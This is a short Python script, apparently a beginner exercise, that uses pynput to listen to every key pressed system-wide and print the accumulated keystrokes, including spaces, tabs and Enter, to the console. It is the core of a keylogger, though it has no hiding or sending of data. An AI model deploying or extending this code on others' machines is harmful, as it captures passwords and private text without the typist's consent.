#!/usr/bin/env python3
import pynput.keyboard


log = ""

def process_key_press(key):
	global log
	try:
		log = log + str(key.char)
	except AttributeError:
		if key == key.space:
			log = log + " "
			# print(log)
		elif key == key.tab:
			log = log + "Tab "
		elif key== key.enter:
			log = log + "enter "
		else:
			log =  log + str(key)
	print(log)
		
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
	keyboard_listener.join()

